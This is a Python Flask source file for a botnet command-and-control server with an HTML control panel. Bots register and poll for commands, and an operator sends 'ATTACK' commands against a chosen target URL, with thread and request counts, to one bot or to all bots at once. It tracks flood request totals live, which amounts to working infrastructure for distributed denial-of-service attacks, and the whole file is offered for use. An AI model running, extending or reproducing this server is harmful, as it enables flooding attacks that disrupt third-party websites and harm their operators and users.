#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
╔════════════════════════════════════════════════════════════════════╗
║      Python C&C Server v10.3 - FIX REQUEST TRACKING - FINAL       ║
║  Fixed: Real-time Request Counting • Live Stats • Proper Display  ║
╚════════════════════════════════════════════════════════════════════╝

Author: huynhthienphat
Date: 2025-11-23 15:16:33 UTC
"""

import os
import threading
import time
import json
import socket
import platform
from datetime import datetime
from flask import Flask, request, render_template_string, jsonify, redirect
from flask_cors import CORS
from flask_socketio import SocketIO, emit
import uuid
from pathlib import Path

app = Flask(__name__)
CORS(app)
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

PORT = 5000
LOG_DIR = Path('./logs')
LOG_DIR.mkdir(exist_ok=True)

# FIX: Better tracking
connected_clients = {}
pending_bot_commands = {}
executed_commands = {}
total_requests_sent = 0  # FIX: Global counter

CURRENT_USER = "huynhthienphat"
CURRENT_TIME = "2025-11-23 15:16:33"

class PythonCCServer:
    def __init__(self):
        self.device_name = socket.gethostname()
        self.username = CURRENT_USER
        self.start_time = datetime.utcnow()
    
    def print_banner(self):
        print(f"""
╔════════════════════════════════════════════════════════════════════╗
║      Python C&C Server v10.3 - REQUEST TRACKING SYSTEM           ║
╚════════════════════════════════════════════════════════════════════╝

📍 Server: {self.device_name}
👤 User: {self.username}
🌐 Web: http://localhost:{PORT}/controller
📡 WebSocket: ws://localhost:{PORT}/socket.io
⏰ Time: {CURRENT_TIME} UTC
🚀 Status: READY

Real-time Request Counting Enabled
""")

cc_server = PythonCCServer()

# ============= BOT ROUTES =============

@app.route('/api/bot/register', methods=['POST'])
def bot_register():
    """Register bot"""
    data = request.json
    bot_id = data.get('botId') or str(uuid.uuid4())
    
    bot = {
        'id': bot_id,
        'name': data.get('botName', f'Bot-{bot_id[:4]}'),
        'registered_at': datetime.utcnow().isoformat(),
        'last_heartbeat': time.time(),
        'requests_sent': 0,  # FIX: Track requests
        'requests_failed': 0,
        'status': 'online'
    }
    
    connected_clients[bot_id] = bot
    pending_bot_commands[bot_id] = []
    
    print(f"✓ Bot registered: {bot['name']} ({bot_id})")
    
    socketio.emit('bots_updated', {
        'bots': list(connected_clients.values()),
        'total': len(connected_clients)
    }, broadcast=True)
    
    return jsonify({
        'success': True,
        'botId': bot_id,
        'message': f'Registered as {bot["name"]}'
    })

@app.route('/api/bot/unregister', methods=['POST'])
def bot_unregister():
    """Unregister bot"""
    bot_id = request.json.get('botId')
    if bot_id in connected_clients:
        bot = connected_clients.pop(bot_id)
        if bot_id in pending_bot_commands:
            del pending_bot_commands[bot_id]
        print(f"✗ Bot unregistered: {bot['name']}")
    return jsonify({'success': True})

@app.route('/api/bot/heartbeat', methods=['POST'])
def bot_heartbeat():
    """FIX: Receive and track heartbeat with requests"""
    data = request.json
    bot_id = data.get('botId')
    
    if bot_id in connected_clients:
        bot = connected_clients[bot_id]
        old_sent = bot['requests_sent']
        
        bot['last_heartbeat'] = time.time()
        bot['requests_sent'] = data.get('requests_sent', 0)  # FIX: Get from heartbeat
        bot['requests_failed'] = data.get('requests_failed', 0)
        bot['status'] = data.get('status', 'online')
        
        # FIX: Update global counter
        global total_requests_sent
        delta = bot['requests_sent'] - old_sent
        if delta > 0:
            total_requests_sent += delta
            print(f"📊 {bot['name']}: +{delta:,} requests (Total: {total_requests_sent:,})")
        
        socketio.emit('bot_updated', bot, broadcast=True)
        socketio.emit('stats_updated', {
            'total_requests': total_requests_sent,
            'bots': list(connected_clients.values())
        }, broadcast=True)
    
    return jsonify({'success': True})

@app.route('/api/bot/get-command', methods=['POST'])
def bot_get_command():
    """Get command"""
    bot_id = request.json.get('botId')
    
    if bot_id not in connected_clients:
        return jsonify({
            'success': False,
            'hasCommand': False,
            'command': None
        }), 404
    
    connected_clients[bot_id]['last_heartbeat'] = time.time()
    
    # FIX: Return pending commands
    if bot_id in pending_bot_commands and len(pending_bot_commands[bot_id]) > 0:
        command = pending_bot_commands[bot_id].pop(0)
        
        bot_name = connected_clients[bot_id]['name']
        print(f"📤 Sending command to {bot_name}: {command.get('action')} {command.get('target')}")
        
        return jsonify({
            'success': True,
            'hasCommand': True,
            'command': command
        })
    
    return jsonify({
        'success': True,
        'hasCommand': False,
        'command': None
    })

@app.route('/api/track-request', methods=['POST'])
def track_request():
    """FIX: Track requests properly"""
    data = request.json
    bot_id = data.get('botId')
    count = data.get('count', 0)
    failed = data.get('failed', 0)
    
    if bot_id in connected_clients:
        bot = connected_clients[bot_id]
        
        # FIX: Add to existing count
        bot['requests_sent'] += count
        bot['requests_failed'] += failed
        
        # FIX: Update global counter
        global total_requests_sent
        if count > 0:
            total_requests_sent += count
            print(f"✓ Synced from {bot['name']}: +{count:,} requests (Total: {total_requests_sent:,})")
        
        socketio.emit('stats_updated', {
            'total_requests': total_requests_sent,
            'bots': list(connected_clients.values())
        }, broadcast=True)
    
    return jsonify({'success': True})

@app.route('/api/send-attack-command', methods=['POST'])
def send_attack_command():
    """Send attack command"""
    data = request.json
    bot_id = data.get('botId')
    target = data.get('target', '')
    threads = data.get('threads', 100)
    requests_count = data.get('requests', 10000)
    broadcast = data.get('broadcast', False)
    
    if not target:
        return jsonify({'success': False, 'error': 'Target required'}), 400
    
    # Create command
    cmd_id = str(uuid.uuid4())
    command = {
        'id': cmd_id,
        'action': 'ATTACK',
        'target': target,
        'threads': threads,
        'requests': requests_count,
        'timestamp': datetime.utcnow().isoformat()
    }
    
    target_bots = []
    
    if broadcast:
        print(f"\n📢 BROADCASTING ATTACK")
        print(f"   Target: {target}")
        print(f"   Threads: {threads}")
        print(f"   Requests: {requests_count:,}\n")
        
        for bot_id_iter in list(connected_clients.keys()):
            if bot_id_iter in pending_bot_commands:
                pending_bot_commands[bot_id_iter].append(command)
                target_bots.append(bot_id_iter)
                bot_name = connected_clients[bot_id_iter]['name']
                print(f"   ✓ Queued for {bot_name}")
    else:
        if bot_id and bot_id in connected_clients:
            if bot_id in pending_bot_commands:
                pending_bot_commands[bot_id].append(command)
                target_bots.append(bot_id)
                
                bot_name = connected_clients[bot_id]['name']
                print(f"\n📤 SENDING ATTACK COMMAND")
                print(f"   Bot: {bot_name}")
                print(f"   Target: {target}")
                print(f"   Threads: {threads}")
                print(f"   Requests: {requests_count:,}\n")
        else:
            return jsonify({'success': False, 'error': 'Bot not found'}), 404
    
    executed_commands[cmd_id] = {
        'target': target,
        'bots': target_bots,
        'timestamp': datetime.utcnow().isoformat()
    }
    
    return jsonify({
        'success': True,
        'commandId': cmd_id,
        'targetBots': target_bots,
        'message': f'Command queued for {len(target_bots)} bot(s)'
    })

@app.route('/api/bots', methods=['GET'])
def get_bots():
    """Get bots"""
    return jsonify({
        'success': True,
        'totalBots': len(connected_clients),
        'totalRequests': total_requests_sent,
        'bots': list(connected_clients.values())
    })

@app.route('/api/status', methods=['GET'])
def get_status():
    """Get status"""
    return jsonify({
        'success': True,
        'connectedBots': len(connected_clients),
        'totalRequests': total_requests_sent,
        'currentUser': CURRENT_USER,
        'currentTime': CURRENT_TIME
    })

# ============= WEBSOCKET =============

@socketio.on('connect')
def handle_connect():
    print(f"✓ Web client connected\n")
    emit('bots_updated', {
        'bots': list(connected_clients.values()),
        'total': len(connected_clients)
    })
    emit('stats_updated', {
        'total_requests': total_requests_sent,
        'bots': list(connected_clients.values())
    })

@socketio.on('request_bots')
def handle_request_bots():
    """Request bots"""
    emit('bots_updated', {
        'bots': list(connected_clients.values()),
        'total': len(connected_clients)
    })

# ============= WEB ROUTES =============

@app.route('/')
def index():
    return redirect('/controller')

@app.route('/controller')
def controller():
    return render_template_string(WEB_CONTROLLER_HTML)

# ============= HTML =============

WEB_CONTROLLER_HTML = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Python C&C - Control Panel v10.3</title>
    <script src="https://cdn.socket.io/4.5.4/socket.io.js"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Courier New', monospace; background: #0f172a; color: #10b981; min-height: 100vh; padding: 20px; }
        .container { max-width: 1400px; margin: 0 auto; }
        .header { background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%); color: white; padding: 20px; border-radius: 8px; margin-bottom: 20px; }
        .header h1 { font-size: 26px; margin-bottom: 10px; }
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
        .panel { background: #1e293b; border: 2px solid #3b82f6; border-radius: 8px; padding: 20px; }
        .panel h2 { color: #60a5fa; margin-bottom: 15px; }
        input, textarea { background: #0f172a; border: 2px solid #3b82f6; color: #10b981; padding: 10px; border-radius: 4px; font-family: 'Courier New'; width: 100%; }
        button { background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%); color: white; border: none; padding: 12px; border-radius: 6px; cursor: pointer; width: 100%; margin-top: 10px; font-weight: bold; }
        button:hover { transform: translateY(-2px); }
        .bots-list { display: flex; flex-direction: column; gap: 10px; max-height: 300px; overflow-y: auto; }
        .bot-item { background: #0f172a; border: 2px solid #3b82f6; padding: 12px; border-radius: 6px; cursor: pointer; transition: all 0.3s; }
        .bot-item:hover { background: #3b82f6; }
        .bot-item.selected { background: #10b981; }
        .stats { display: grid; grid-template-columns: repeat(4, 1fr); gap: 15px; margin-bottom: 20px; }
        .stat-card { background: #1e293b; border: 2px solid #3b82f6; padding: 15px; border-radius: 8px; text-align: center; }
        .stat-value { font-size: 28px; font-weight: bold; color: #60a5fa; }
        .stat-label { font-size: 12px; color: #cbd5e1; margin-top: 5px; }
        .message { padding: 10px; border-radius: 4px; margin-bottom: 10px; font-size: 12px; }
        .success { background: #064e3b; color: #86efac; }
        .error { background: #7f1d1d; color: #fca5a5; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🤖 Python C&C - Control Panel v10.3</h1>
            <p>✓ Real-time Request Tracking • 🤖 Bots: <strong id="bot-count">0</strong> | 📊 Requests: <strong id="request-count">0</strong></p>
        </div>

        <div class="stats">
            <div class="stat-card">
                <div class="stat-value" id="total-requests">0</div>
                <div class="stat-label">Total Requests</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="total-bots">0</div>
                <div class="stat-label">Connected Bots</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="avg-requests">0</div>
                <div class="stat-label">Requests/Bot</div>
            </div>
            <div class="stat-card">
                <div class="stat-value">v10.3</div>
                <div class="stat-label">Version</div>
            </div>
        </div>

        <div id="message-container"></div>

        <div class="grid">
            <div class="panel">
                <h2>🤖 Select Bot</h2>
                <button onclick="refreshBots()">🔄 Refresh</button>
                <div class="bots-list" id="bots-container">
                    <div style="color: #cbd5e1; text-align: center; padding: 20px;">⏳ No bots</div>
                </div>
            </div>

            <div class="panel">
                <h2>🔥 Send Attack</h2>
                <label style="color: #cbd5e1; font-size: 12px;">Target:</label>
                <input type="text" id="target" placeholder="http://example.com">
                <label style="color: #cbd5e1; font-size: 12px; margin-top: 10px;">Threads:</label>
                <input type="number" id="threads" value="100">
                <label style="color: #cbd5e1; font-size: 12px; margin-top: 10px;">Requests:</label>
                <input type="number" id="requests" value="10000">
                <button onclick="sendAttack()">🔥 Send Attack</button>
                <button onclick="broadcastAttack()" style="background: #f59e0b;">📢 Broadcast</button>
            </div>
        </div>
    </div>

    <script>
        const socket = io();
        let selectedBot = null;
        let allBots = [];

        socket.on('bots_updated', (data) => {
            allBots = data.bots || [];
            document.getElementById('total-bots').textContent = data.total || 0;
            document.getElementById('bot-count').textContent = data.total || 0;
            updateBotsList();
        });

        socket.on('stats_updated', (data) => {
            const totalRequests = data.total_requests || 0;
            document.getElementById('total-requests').textContent = totalRequests.toLocaleString();
            document.getElementById('request-count').textContent = totalRequests.toLocaleString();
            
            const bots = data.bots || [];
            if (bots.length > 0) {
                const avgRequests = Math.round(totalRequests / bots.length);
                document.getElementById('avg-requests').textContent = avgRequests.toLocaleString();
            }
        });

        function refreshBots() {
            socket.emit('request_bots');
        }

        function updateBotsList() {
            const container = document.getElementById('bots-container');
            if (!allBots.length) {
                container.innerHTML = '<div style="color: #cbd5e1; text-align: center; padding: 20px;">⏳ No bots</div>';
                return;
            }

            container.innerHTML = allBots.map(bot => `
                <div class="bot-item ${selectedBot?.id === bot.id ? 'selected' : ''}" onclick="selectBot('${bot.id}', '${bot.name}')">
                    <strong>${bot.name}</strong>
                    <br><small>📊 ${(bot.requests_sent || 0).toLocaleString()} requests</small>
                </div>
            `).join('');
        }

        function selectBot(botId, botName) {
            selectedBot = { id: botId, name: botName };
            updateBotsList();
            showMessage(`✓ Selected: ${botName}`, 'success');
        }

        async function sendAttack() {
            const target = document.getElementById('target').value.trim();
            const threads = parseInt(document.getElementById('threads').value) || 100;
            const requests = parseInt(document.getElementById('requests').value) || 10000;

            if (!selectedBot) {
                showMessage('❌ Select bot!', 'error');
                return;
            }
            if (!target) {
                showMessage('❌ Enter target!', 'error');
                return;
            }

            try {
                const res = await fetch('/api/send-attack-command', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ botId: selectedBot.id, target, threads, requests, broadcast: false })
                });

                const data = await res.json();
                if (data.success) {
                    showMessage(`✓ Attack sent to ${selectedBot.name}!`, 'success');
                    document.getElementById('target').value = '';
                } else {
                    showMessage(`❌ ${data.error}`, 'error');
                }
            } catch (e) {
                showMessage(`❌ ${e.message}`, 'error');
            }
        }

        async function broadcastAttack() {
            const target = document.getElementById('target').value.trim();
            if (!target) {
                showMessage('❌ Enter target!', 'error');
                return;
            }

            try {
                const res = await fetch('/api/send-attack-command', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        target,
                        threads: parseInt(document.getElementById('threads').value),
                        requests: parseInt(document.getElementById('requests').value),
                        broadcast: true
                    })
                });

                const data = await res.json();
                if (data.success) {
                    showMessage(`✓ Broadcast to ${data.targetBots.length} bots!`, 'success');
                    document.getElementById('target').value = '';
                }
            } catch (e) {
                showMessage(`❌ ${e.message}`, 'error');
            }
        }

        function showMessage(msg, type) {
            const container = document.getElementById('message-container');
            container.innerHTML = `<div class="message ${type}">${msg}</div>`;
            setTimeout(() => { container.innerHTML = ''; }, 4000);
        }

        setInterval(refreshBots, 2000);
    </script>
</body>
</html>
'''

# ============= MAIN =============

if __name__ == '__main__':
    cc_server.print_banner()
    try:
        print(f"🚀 Starting on http://localhost:{PORT}/controller\n")
        socketio.run(app, host='0.0.0.0', port=PORT, debug=False, use_reloader=False)
    except KeyboardInterrupt:
        print("\n\n👋 Shutdown...")